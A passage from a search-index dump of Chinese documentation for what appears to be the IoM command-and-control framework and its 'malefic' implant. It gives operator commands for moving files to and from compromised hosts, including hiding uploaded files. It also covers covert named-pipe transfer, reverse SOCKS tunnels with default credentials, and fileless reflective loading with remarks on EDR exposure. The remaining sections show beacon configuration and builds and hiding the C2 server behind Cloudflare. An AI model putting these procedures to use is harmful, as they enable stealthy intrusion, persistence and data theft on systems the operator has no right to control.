./file.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u6587\u4ef6\u4f20\u8f93","title":"\u6587\u4ef6\u4f20\u8f93","text":"<p>\u5728\u672c\u5730\u4e0e\u76ee\u6807\u7cfb\u7edf\u4e4b\u95f4\u4f20\u8f93\u6587\u4ef6\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u4e0a\u4f20\u6587\u4ef6","title":"\u4e0a\u4f20\u6587\u4ef6","text":"<p><pre><code>upload [local] [remote] [flags]\n</code></pre> \u5c06\u672c\u5730\u6587\u4ef6\u4e0a\u4f20\u5230\u76ee\u6807\u7cfb\u7edf\u7684\u6307\u5b9a\u8def\u5f84\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--hidden</code>: \u4e0a\u4f20\u540e\u5c06\u6587\u4ef6\u8bbe\u7f6e\u4e3a\u9690\u85cf\u5c5e\u6027</p> </li> <li> <p><code>--priv string</code>: \u6587\u4ef6\u6743\u9650\uff08\u9ed8\u8ba40644\uff0c\u9002\u7528\u4e8e\u7c7bUnix\u7cfb\u7edf\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>upload ./file.txt /tmp/file.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u4e0b\u8f7d\u6587\u4ef6","title":"\u4e0b\u8f7d\u6587\u4ef6","text":"<p><pre><code>download [implant_file]\n</code></pre> \u4ece\u76ee\u6807\u7cfb\u7edf\u4e0b\u8f7d\u6307\u5b9a\u6587\u4ef6\u5230\u672c\u5730\u3002</p> <p>\u793a\u4f8b: <pre><code>download ./file.txt\n</code></pre></p> <p>\u5728gui\u4e2d\uff0c\u5de6\u4fa7\u663e\u793a\u680f\u663e\u793a\u4e86Remote Files\uff0c\u662f\u5f53\u524d\u4f1a\u8bdd\u4e0a\u7684\u8fdc\u7a0b\u6587\u4ef6\u5939\u548c\u8fdc\u7a0b\u6587\u4ef6\u663e\u793a\u3002</p> <p></p> <p>\u4f60\u53ef\u4ee5\u53f3\u51fb\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4e0a\u4f20\u6587\u4ef6\u6216\u8005\u5237\u65b0\u6587\u4ef6\u3002</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u53f3\u51fb\u4e00\u4e2a\u6587\u4ef6\uff0c\u5220\u9664\u6587\u4ef6\u6216\u4e0b\u8f7d\u8be5\u6587\u4ef6\u3002</p> <p></p>"},{"location":"IoM/guideline/post_exploitation/#\u547d\u540d\u7ba1\u9053\u7ba1\u7406","title":"\u547d\u540d\u7ba1\u9053\u7ba1\u7406","text":"<p><code>pipe</code> \u547d\u4ee4\u7528\u4e8e\u7ba1\u7406 Windows \u7cfb\u7edf\u7684\u547d\u540d\u7ba1\u9053\uff08Named Pipes\uff09\uff0c\u652f\u6301\u4ece\u7ba1\u9053\u8bfb\u53d6\u6570\u636e\u3001\u5411\u7ba1\u9053\u4e0a\u4f20\u6587\u4ef6\u5185\u5bb9\u7b49\u64cd\u4f5c\uff0c\u53ef\u7528\u4e8e\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u6216\u9690\u853d\u6570\u636e\u4f20\u8f93\u3002</p> <p><pre><code>pipe [\u5b50\u547d\u4ee4]\n</code></pre> \u652f\u6301\u7684\u5b50\u547d\u4ee4\u5305\u62ec\uff1a</p> <ul> <li> <p><code>pipe read</code>\uff1a\u4ece\u6307\u5b9a\u547d\u540d\u7ba1\u9053\u8bfb\u53d6\u6570\u636e</p> </li> <li> <p><code>pipe upload</code>\uff1a\u5c06\u6587\u4ef6\u5185\u5bb9\u4e0a\u4f20\u5230\u6307\u5b9a\u547d\u540d\u7ba1\u9053</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#pipe-read","title":"pipe read","text":"<p>\u4ece\u76ee\u6807\u7cfb\u7edf\u7684\u6307\u5b9a\u547d\u540d\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u83b7\u53d6\u7ba1\u9053\u5185\u4f20\u8f93\u7684\u5185\u5bb9\uff08\u5982\u8fdb\u7a0b\u95f4\u4ea4\u4e92\u6570\u636e\u3001\u65e5\u5fd7\u4fe1\u606f\u7b49\uff09\u3002 \u547d\u4ee4\u683c\u5f0f\uff1a <pre><code>pipe read [\u7ba1\u9053\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u8bfb\u53d6\u7cfb\u7edf\u4e2d\u540d\u4e3a <code>\\\\.\\pipe\\test_pipe</code> \u7684\u547d\u540d\u7ba1\u9053\u6570\u636e\uff1a <pre><code>pipe read \\\\.\\pipe\\test_pipe\n</code></pre> \u6267\u884c\u540e\uff0cImplant \u4f1a\u6301\u7eed\u76d1\u542c\u8be5\u7ba1\u9053\uff0c\u5c06\u8bfb\u53d6\u5230\u7684\u6570\u636e\u5b9e\u65f6\u56de\u663e\u5230\u63a7\u5236\u53f0\uff1b\u82e5\u7ba1\u9053\u65e0\u6570\u636e\u4f20\u8f93\uff0c\u4f1a\u7b49\u5f85\u76f4\u81f3\u7ba1\u9053\u5173\u95ed\u6216\u8d85\u65f6\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#pipe-upload","title":"pipe upload","text":"<p>\u5c06\u76ee\u6807\u7cfb\u7edf\u4e2d\u6307\u5b9a\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4e0a\u4f20\u5230\u547d\u540d\u7ba1\u9053\u4e2d\uff0c\u4f9b\u76d1\u542c\u8be5\u7ba1\u9053\u7684\u8fdb\u7a0b\u8bfb\u53d6\uff08\u5982\u5b9e\u73b0\u9690\u853d\u6570\u636e\u5171\u4eab\u3001\u8fdb\u7a0b\u95f4\u6570\u636e\u6295\u5582\u7b49\u573a\u666f\uff09\u3002 <pre><code>pipe upload [\u7ba1\u9053\u540d\u79f0] [\u6587\u4ef6\u8def\u5f84]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u5c06 <code>C:\\Temp\\data.bin</code> \u6587\u4ef6\u7684\u5185\u5bb9\u4e0a\u4f20\u5230 <code>\\\\.\\pipe\\test_pipe</code> \u547d\u540d\u7ba1\u9053\uff1a <pre><code>pipe upload \\\\.\\pipe\\test_pipe C:\\\\Temp\\\\data.bin\n</code></pre> \u6267\u884c\u540e\uff0cImplant \u4f1a\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u5199\u5165\u7ba1\u9053\uff0c\u4f20\u8f93\u5b8c\u6210\u540e\u8fd4\u56de\u201c\u4e0a\u4f20\u6210\u529f\u201d\u6216\u201c\u4f20\u8f93\u5931\u8d25\u201d\u7684\u72b6\u6001\u63d0\u793a\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u7f51\u7edc\u4ee3\u7406","title":"\u7f51\u7edc\u4ee3\u7406","text":"<p>\u901a\u8fc7Implant\u8f6c\u53d1\u7f51\u7edc\u6d41\u91cf\uff0c\u5b9e\u73b0\u95f4\u63a5\u8bbf\u95ee\u76ee\u6807\u7f51\u7edc\u8d44\u6e90\u3002\u5728IoM\u4e2d\uff0c\u7edd\u5927\u90e8\u5206\u7f51\u7edc\u76f8\u5173\u529f\u80fd\u90fd\u57fa\u4e8erem\u5b9e\u73b0\u3002</p> <p>rem\u6307\u5357</p> <p>\u6709\u5173rem\u7684\u5b9e\u73b0\uff0c\u8bf7\u53c2\u9605Rem</p>"},{"location":"IoM/guideline/post_exploitation/#\u7aef\u53e3\u8f6c\u53d1","title":"\u7aef\u53e3\u8f6c\u53d1","text":""},{"location":"IoM/guideline/post_exploitation/#\u672c\u5730\u7aef\u53e3\u8f6c\u53d1","title":"\u672c\u5730\u7aef\u53e3\u8f6c\u53d1","text":"<p><pre><code>portfwd [pipeline] [flags]\n</code></pre> \u5c06\u672c\u5730\u7aef\u53e3\u7684\u6d41\u91cf\u901a\u8fc7Implant\u8f6c\u53d1\u5230\u8fdc\u7a0b\u76ee\u6807\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> <li> <p><code>-t, --target string</code>: \u8fdc\u7a0b\u76ee\u6807\u5730\u5740\uff08\u683c\u5f0f\uff1ahost:port\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>portfwd tcp --port 8080 --target 192.168.1.1:80\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u672c\u5730\u6a21\u5f0f","title":"\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\uff08\u672c\u5730\u6a21\u5f0f\uff09","text":"<p><pre><code>portfwd_local [pipeline] [agent] [flags]\n</code></pre> \u5728\u672c\u5730\u6a21\u5f0f\u4e0b\u5c06\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7a0b\u76ee\u6807\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-l, --local string</code>: \u672c\u5730\u8fde\u63a5\u5730\u5740\uff08\u683c\u5f0f\uff1ahost:port\uff09</p> </li> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>portfwd_local rdp_local win10_agent --port 3389 --local 127.0.0.1:3389\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1","title":"\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u901a\u8fc7Implant\u4ece\u8fdc\u7a0b\u76ee\u6807\u521b\u5efa\u53cd\u5411\u8fde\u63a5\u5230\u672c\u5730\uff0c\u5b9e\u73b0\u7a7f\u900f\u9632\u706b\u5899\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1_1","title":"\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1","text":"<p><pre><code>reverse [pipeline] [flags]\n</code></pre> \u901a\u8fc7Implant\u4ece\u8fdc\u7a0b\u76ee\u6807\u521b\u5efa\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u7aef\u53e3\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--password string</code>: \u8ba4\u8bc1\u5bc6\u7801\uff08\u9ed8\u8ba4maliceofinternal\uff09</p> </li> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> <li> <p><code>--protocol string</code>: \u5165\u7ad9\u534f\u8bae\uff08\u9ed8\u8ba4socks5\uff09</p> </li> <li> <p><code>-u, --username string</code>: \u8ba4\u8bc1\u7528\u6237\u540d\uff08\u9ed8\u8ba4maliceofinternal\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>reverse rem --port 12345\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1","title":"\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1","text":"<p><pre><code>rportfwd [pipeline] [flags]\n</code></pre> \u901a\u8fc7Implant\u5c06\u8fdc\u7a0b\u76ee\u6807\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u7aef\u53e3\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> <li> <p><code>-r, --remote string</code>: Implant\u7684\u8fde\u63a5\u5730\u5740\uff08\u683c\u5f0f\uff1ahost:port\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>rportfwd http --port 8080 --remote 192.168.1.1:80\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u672c\u5730\u6a21\u5f0f","title":"\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\uff08\u672c\u5730\u6a21\u5f0f\uff09","text":"<p><pre><code>rportfwd_local [pipeline] [agent] [flags]\n</code></pre> \u901a\u8fc7Implant\u5230\u5ba2\u6237\u7aef\u7684\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> <li> <p><code>-r, --remote string</code>: Implant\u5185\u90e8\u8fde\u63a5\u5730\u5740\uff08\u683c\u5f0f\uff1ahost:port\uff09</p> </li> </ul> <pre><code>rportfwd_local tcp intranet_agent --port 33890 --remote 192.168.5.10:3389\n</code></pre>"},{"location":"IoM/guideline/post_exploitation/#\u4ee3\u7406\u670d\u52a1\u5668","title":"\u4ee3\u7406\u670d\u52a1\u5668","text":"<p>\u901a\u8fc7Implant\u521b\u5efa\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u5b9e\u73b0\u5bf9\u76ee\u6807\u7f51\u7edc\u7684\u95f4\u63a5\u8bbf\u95ee\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u521b\u5efa\u4ee3\u7406","title":"\u521b\u5efa\u4ee3\u7406","text":"<p><pre><code>proxy [pipeline] [flags]\n</code></pre> \u901a\u8fc7Implant\u521b\u5efa\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u652f\u6301\u8ba4\u8bc1\u673a\u5236\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--password string</code>: \u8ba4\u8bc1\u5bc6\u7801\uff08\u9ed8\u8ba4maliceofinternal\uff09</p> </li> <li> <p><code>-p, --port string</code>: \u672c\u5730\u76d1\u542c\u7aef\u53e3</p> </li> <li> <p><code>--protocol string</code>: \u5165\u7ad9\u534f\u8bae\uff08\u9ed8\u8ba4socks5\uff09</p> </li> <li> <p><code>-u, --username string</code>: \u8ba4\u8bc1\u7528\u6237\u540d\uff08\u9ed8\u8ba4maliceofinternal\uff09</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>proxy http --port 8080\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#rem-\u64cd\u4f5c","title":"REM \u64cd\u4f5c","text":"<p>\u901a\u8fc7REM\u534f\u8bae\u5728Implant\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u64cd\u4f5c\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#rem-\u534f\u8bae\u8fdc\u7a0b\u8fde\u63a5","title":"REM \u534f\u8bae\u8fdc\u7a0b\u8fde\u63a5","text":"<p><pre><code>rem_dial [pipeline] [args]\n</code></pre> \u5728Implant\u4e0a\u8fd0\u884cREM\u534f\u8bae\u5ba2\u6237\u7aef\uff0c\u5efa\u7acbREM\u8fde\u63a5\u3002</p> <p>\u793a\u4f8b: <pre><code>rem_dial rem -- -c tcp://4n0n4k4y:@127.0.0.1:34996?wrapper=I31%2x2qb0TVNZvNy8KwixYX%2BH%2FUXkHmxJVH0yi05m2iVZehaAXq3tyJSObIkorkM0Uhzf3qmt1bNbB7Y0o2igaBWbvrLZD9%2Fi78pUGLYOPCVLVNECfC4hvncQKVVKDxQ7IywfzaHVTG6bow4tjHdtifHI1VBRX3dGNx93T5LuFjHhBqu40ZPzwdhpGrEIA9bfzVAFW8TxZa3vMqLFXV9kSSb0%2F8Cbv\n</code></pre></p> <p>rem\u6307\u5357</p> <p>\u6709\u5173rem\u7684\u53c2\u6570\u76f8\u5173\u4f7f\u7528\uff0c\u8bf7\u53c2\u9605rem</p> <p>\u6709\u5173listener\u7684pipeline\u914d\u7f6e\uff0c\u8bf7\u53c2\u9605listener</p>"},{"location":"IoM/guideline/proxy/","title":"\u4ee3\u7406/\u96a7\u9053","text":"<p>\u5728IoM\u4e2d\uff0c\u7edd\u5927\u90e8\u5206\u7f51\u7edc\u76f8\u5173\u529f\u80fd\u90fd\u57fa\u4e8erem\u5b9e\u73b0\u3002 \u4f46\u56e0\u4e3arem\u5e76\u975e\u57fa\u4e8erust\u5b9e\u73b0\uff0c \u4f46\u51fa\u4e8e\u591a\u79cd\u56e0\u7d20\u8003\u8651\uff0c rem\u6ca1\u6709\u6210\u4e3a\u9ed8\u8ba4\u5f00\u542f\u7684\u9009\u9879\uff0c \u6211\u4eec\u63d0\u4f9b\u4e86\u591a\u79cd\u52a0\u8f7drem\u7684\u65b9\u5f0f\uff0c \u4f7f\u5f97rem\u80fd\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u65e0\u7f1d\u96c6\u6210\u3002</p>"},{"location":"IoM/guideline/proxy/#\u52a0\u8f7drem","title":"\u52a0\u8f7drem","text":"<p>v0.1.1\u5f00\u59cb, rem\u7684\u4f7f\u7528\u88ab\u5927\u5927\u7b80\u5316\uff0c\u867d\u7136\u4e0d\u662f\u9ed8\u8ba4\u6a21\u5757\uff0c \u4f46\u662f\u5df2\u7ecf\u7b80\u5316\u5230\u4e0d\u5e26\u6765\u989d\u5916\u7684\u4f7f\u7528\u548c\u7406\u89e3\u56f0\u96be\u7684\u7a0b\u5ea6</p> <p>\u5728IoM\u7684v0.1.0\u4e2d\u96c6\u6210\u4e86\u4e00\u7cfb\u5217rem\u76f8\u5173\u7684\u529f\u80fd. IoM\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u6253\u901aimplant\u4e0erem\u7684\u4ea4\u4e92\u3002</p>"},{"location":"IoM/guideline/proxy/#\u65b9\u6cd51-\u53cd\u5c04\u52a0\u8f7dexe\u7a0b\u5e8f","title":"\u65b9\u6cd51 \u53cd\u5c04\u52a0\u8f7dEXE\u7a0b\u5e8f","text":"<p>rust implant\u7684execute_exe \u80fd\u5b8c\u7f8e\u52a0\u8f7drem\uff0c \u5c31\u50cf\u5728\u672c\u5730\u4f7f\u7528\u4e00\u6837\u3002 </p> <pre><code>execute_exe rem.exe -- -c [rem_link] ... \n</code></pre> <p>\u6216\u57fa\u4e8eRDI\u7684\u5b9e\u73b0 <pre><code>execute_shellcode rem.exe -- -c [rem_link] ...\n</code></pre></p> <p>\u4f18\u70b9</p> <ul> <li>\u65e0\u6587\u4ef6\u843d\u5730</li> <li>\u652f\u6301RDI\u548cPIC\u4e24\u79cd\u52a0\u8f7d\u65b9\u5f0f</li> </ul> <p>\u7f3a\u70b9</p> <ul> <li>\u6709\u65b0\u8fdb\u7a0b\u4ea7\u751f\uff0c\u5e76\u4e14\u65e0\u6cd5\u4f7f\u7528inline\u7248\u672c\u7684\u52a0\u8f7d\u5668\u3002\u5bf9\u67d0\u4e9b\u9ad8\u5f3a\u5ea6\u7aef\u4e0a\u5bf9\u6297\u73af\u5883\u6709\u66b4\u9732\u9762</li> <li>\u4e0epipeline\u4ea4\u4e92\u6709\u5ef6\u8fdf\uff0c \u9700\u8981\u7b49\u5f8530-60\u79d2\u624d\u80fd\u5c06\u65b0\u7684pivoting\u6570\u636e\u540c\u6b65</li> <li>\u53ea\u652f\u6301windows</li> </ul>"},{"location":"IoM/guideline/proxy/#\u65b9\u6cd52-\u52a8\u6001\u52a0\u8f7d-module","title":"\u65b9\u6cd52 \u52a8\u6001\u52a0\u8f7d module","text":"<p>\u5c06rem\u6253\u5305\u6210dll, \u57fa\u4e8eCgo\u4e0eFFI\u5b9e\u73b0\u8de8\u8bed\u8a00\u8c03\u7528</p> <p>\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\uff0c \u4e0d\u9700\u8981\u5173\u6ce8\u8fd9\u4e9b\u7ec6\u8282\uff0c \u76f8\u5173\u4ee3\u7801\u5df2\u7ecf\u5728IoM\u7684\u63d2\u4ef6\u4ed3\u5e93 \u4e2d\u5b8c\u6210\u4e86\u5bf9\u5e94\u7684\u5c01\u88c5\u3002</p> <p>\u4e0a\u7ebf\u540e\uff0c\u5728IoM\u547d\u4ee4\u884c\u4e2d\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u5373\u53ef\u5b89\u88c5\u5e76\u4f7f\u7528rem\u3002</p> <p>rem_community\u5df2\u5728v0.1.1\u6253\u5305\u5230client</p> <pre><code># \u52a0\u8f7drem dll\nrem_community load \n\n# \u9009\u62e9\u5bf9\u5e94\u7684rem pipeline, \u642d\u5efa\u4e86\u53cd\u5411\u4ee3\u7406\u96a7\u9053\nrem_community socks5 rem_pipeline\n</code></pre> <p>\u4f18\u70b9</p> <ul> <li>\u76f8\u6bd4<code>execute-exe/execute-shellcode</code>\u597d\u7684\u5730\u65b9\u5728\u4e8e\uff0c \u4e0d\u4f1a\u6709\u65b0\u8fdb\u7a0bfork\uff0c \u4e00\u5207\u90fd\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u5b8c\u6210\u3002 </li> <li>\u8054\u52a8IoM rem pipeline\uff0c\u80fd\u5b9e\u65f6\u540c\u6b65pivoting\u5e76\u8fdb\u884c\u540e\u7eed\u7ba1\u7406</li> </ul> <p>\u7f3a\u70b9</p> <ul> <li>\u9700\u8981\u53cd\u5c04\u52a0\u8f7ddll, \u53ef\u80fd\u4f1a\u7559\u4e0bEDR\u7684\u90e8\u5206\u66b4\u9732\u9762</li> <li>\u53ea\u652f\u6301windows</li> </ul>"},{"location":"IoM/guideline/proxy/#\u65b9\u6cd53-\u9759\u6001\u94fe\u63a5rem","title":"\u65b9\u6cd53 \u9759\u6001\u94fe\u63a5rem","text":"<p>\u65b9\u6cd51\u548c2\u90fd\u662f\u89e3\u51b3\u4e0a\u7ebf\u540e\u8fdb\u4e00\u6b65\u642d\u5efaproxy/tunnel\uff0c\u672c\u65b9\u6cd5\u76f4\u63a5\u652f\u6301rem\u4fe1\u9053\u4e0a\u7ebf\u4ee5\u53ca\u6240\u6709\u7684rem\u63d0\u4f9b\u7684proxy/tunnel\u529f\u80fd\u3002</p> <pre><code>implants:  \n  ......\n  enable_3rd: true       # enable 3rd module  \n  3rd_modules:            # 3rd module when malefic compile  \n    - rem\n</code></pre> <pre><code>malefic-mutant generate beacon\n</code></pre> <p>windows \u4ec5x86_64-pc-windows-gnu\u652f\u6301, linux \u5747\u652f\u6301 </p> <p>\u9759\u6001\u94fe\u63a5\u7684beacon\u4f53\u79ef\u4f1a\u81a8\u80c0\u4e0d\u5c11\uff0c \u4f46\u662f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528rem</p> <p></p> <p>\u4f8b\u5982\u642d\u5efa\u53cd\u5411socks5\u4ee3\u7406\u53ea\u9700\u8981</p> <pre><code>reverse [rem_defualt]\n</code></pre> <p>\u624b\u52a8\u6307\u5b9arem\u547d\u4ee4 <pre><code>rem_dial [rem_default] -- -c ...\n</code></pre></p> <p>\u4f18\u70b9</p> <ul> <li>\u652f\u6301windows/linux</li> <li>\u8054\u52a8IoM rem pipeline</li> <li>\u80fd\u590d\u7528rem\u7684\u4fe1\u9053\u5b9e\u73b0\u4e0a\u7ebf</li> <li>\u53ea\u5728\u672c\u8fdb\u7a0b\u4e2d\u6267\u884c\uff0c \u4e0d\u4f1afork\u65b0\u8fdb\u7a0b</li> </ul> <p>\u7f3a\u70b9</p> <ul> <li>\u4f53\u79ef\u4f1a\u81a8\u80c0\uff0c \u5927\u6982\u572810M\u5de6\u53f3\uff0c upx\u540e3-4M</li> <li>\u9759\u6001\u94fe\u63a5\u5e93\u4e0d\u518d\u652f\u6301ollvm, \u5e26\u6765\u4e00\u5b9a\u7684\u9759\u6001\u7279\u5f81</li> </ul>"},{"location":"IoM/guideline/proxy/#rem\u4fe1\u9053\u4e0a\u7ebf","title":"rem\u4fe1\u9053\u4e0a\u7ebf","text":"<p>\u57fa\u4e8e\u9759\u6001\u94fe\u63a5\u7684rem\u6709\u4e00\u4e2a\u72ec\u4e00\u65e0\u4e8c\u7684\u4f18\u52bf\u3002 \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7rem\u6784\u5efa\u7684\u5185\u5b58\u4e2d\u7684\u865a\u62df\u4fe1\u9053\u4e0a\u7ebf\u3002 \u5b9e\u73b0**malefic over rem**</p> <p>\u9700\u8981\u4fee\u6539implant \u7684<code>config.yaml</code></p> <pre><code>basic:  \n  name: \"malefic\"  \n  targets:  \n    - \"127.0.0.1:5001\"  \n  protocol: \"rem\"  \n  tls: false  \n  proxy: \"\"  \n  interval: 5  \n  jitter: 0.2  \n  ca:  \n  encryption: aes  \n  key: maliceofinternal  \n  rem:  \n    link: '[rem_link]'\n</code></pre> <p>\u8fd0\u884cmutant\u751f\u6210\u7f16\u8bd1\u914d\u7f6e\u5e76\u7f16\u8bd1</p> <pre><code>malefic-mutant generate beacon\n\ncargo build --release -p malefic\n</code></pre> <p>debug \u6a21\u5f0f\u4e0b\u7684\u65e5\u5fd7\u3002 \u53ef\u4ee5\u770b\u5230IoM\u7684implant\u57fa\u4e8e\u901a\u8fc7rem\u7684\u6784\u5efa\u7684\u4f20\u8f93\u5c42\u8fdb\u884c\u901a\u8baf</p> <p></p> <p>\u8fd9\u6837\u4e00\u6765\uff0c rem\u652f\u6301\u7684\u6240\u6709\u4f20\u8f93\u5c42\uff0c\u52a0\u5bc6\uff0c\u4f2a\u88c5\u6df7\u6dc6\u90fd\u80fd\u590d\u7528\u5230implant\u4e2d\uff0c \u5b9e\u73b0\u6d41\u91cf\u4fa7\u7684\u4efb\u610f\u4f2a\u88c5\u3002</p>"},{"location":"IoM/guideline/advance/DomainFronting/","title":"\u4f7f\u7528Cloudflare\u8fdb\u884cCDN\u524d\u7f6e","text":"<p>IOM\u5185\u7f6e\u4e86HTTPS, \u6240\u4ee5\u4f60\u53ef\u4ee5\u4f7f\u7528CDN\u3001\u4e91\u51fd\u6570\u7b49\u6765\u9690\u85cfIOM\u670d\u52a1</p> <p>\u4e00\u4e9b\u4f60\u5fc5\u987b\u6ee1\u8db3\u7684\u524d\u63d0\u6761\u4ef6:</p> <ol> <li>\u4e00\u53f0\u5177\u5907\u516c\u7f51IP\u7684\u670d\u52a1\u5668, \u7528\u4e8e\u90e8\u7f72/\u8f6c\u53d1IOM\u670d\u52a1\u7aef\u7684\u7aef\u53e3</li> <li>\u4e00\u4e2aCloudflare\u8d26\u6237, \u7528\u4e8e\u89e3\u6790\u57df\u540d</li> <li>\u4e00\u4e2a\u57df\u540d\uff0c\u53ef\u4ee5\u6258\u7ba1\u5230Cloudflare</li> <li>\u786e\u4fdd\u4f60\u7684pipline\u8fd0\u884c\u572880/443/8080/8443\u7b49cloudflare\u5141\u8bb8\u4ee3\u7406\u7684\u7aef\u53e3\u4e0a</li> </ol>"},{"location":"IoM/guideline/advance/DomainFronting/#\u7ed1\u5b9a\u57df\u540dip","title":"\u7ed1\u5b9a\u57df\u540d&amp;IP","text":"<p>\u9996\u5148\u7ed1\u5b9a\u4e00\u4e2a\u5230\u4f60\u516c\u7f51\u670d\u52a1\u5668\u7684A\u8bb0\u5f55\uff0c\u5e76\u786e\u4fdd\u5f00\u542f\u4e86\u4ee3\u7406\u72b6\u6001\uff0c\u53c2\u8003\u4e0b\u56fe </p>"},{"location":"IoM/guideline/advance/DomainFronting/#\u7533\u8bf7cloudflare\u8bc1\u4e66","title":"\u7533\u8bf7cloudflare\u8bc1\u4e66","text":"<p>\u9700\u8981\u7ed1\u5b9acloudflare\u4e0b\u53d1\u7684\u8bc1\u4e66\u624d\u80fdcdn\u7684\u751f\u6548\uff0c\u7533\u8bf7\u540e\u7684\u8bc1\u4e66\u5b58\u50a8\u5230\u672c\u5730 </p>"},{"location":"IoM/guideline/advance/DomainFronting/#\u5173\u95ed\u7f13\u5b58\u72b6\u6001","title":"\u5173\u95ed\u7f13\u5b58\u72b6\u6001","text":""},{"location":"IoM/guideline/advance/DomainFronting/#\u914d\u7f6essltls\u52a0\u5bc6\u6a21\u5f0f","title":"\u914d\u7f6essl/tls\u52a0\u5bc6\u6a21\u5f0f","text":"<p>\u8bf7\u5c06ssl/tls\u52a0\u5bc6\u6a21\u5f0f\u8bbe\u7f6e\u4e3a\u5b8c\u5168(\u8bf7\u52ff\u4f7f\u7528\u7075\u6d3b) </p> <p></p>"},{"location":"IoM/guideline/advance/DomainFronting/#\u670d\u52a1\u5668-\u90e8\u7f72\u914d\u7f6e","title":"\u670d\u52a1\u5668 \u90e8\u7f72&amp;\u914d\u7f6e","text":"<p>\u4e0a\u8ff0\u6d41\u7a0b\u5b8c\u6210\u540e\u4f60\u9700\u8981\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u8bc1\u4e66\u5e76\u542f\u52a8\uff0c\u53c2\u8003\u5982\u4e0b\u914d\u7f6e <pre><code>  http:\n  - enable: true\n    encryption:\n    - enable: true\n      key: maliceofinternal\n      type: aes\n    - enable: true\n      key: maliceofinternal\n      type: xor\n    error_page: \"\"\n    host: 0.0.0.0\n    name: http\n    parser: auto\n    port: 443\n    tls:\n      enable: true\n      ca_file: cert/a.crt\n      cert_file: cert/a.crt\n      key_file: cert/a.key\n</code></pre> \u7136\u540e\u542f\u52a8server:  </p>"},{"location":"IoM/guideline/advance/DomainFronting/#\u7f16\u8bd1\u6d4b\u8bd5","title":"\u7f16\u8bd1&amp;\u6d4b\u8bd5","text":"<p>\u6839\u636e\u4e0a\u8ff0\u6b65\u9aa4\u914d\u7f6e\u57df\u540d\u540e\uff0c\u7f16\u8bd1malefic\u4e0a\u7ebf\u5373\u53ef <pre><code>build beacon --profile http_default --address demo.cdn.com --target x86_64-pc-windows-gnu\n</code></pre></p> <p>\u90e8\u5206\u65e5\u5fd7\u622a\u56fe\u53c2\u8003\u5982\u4e0b:</p> <p>server\u7aef:</p> <p></p> <p>Client\u7aef:</p> <p></p> <p>Malefic:</p> <p></p>"},{"location":"IoM/guideline/advance/DumpLSASS/","title":"IoM \u7528\u6cd5: 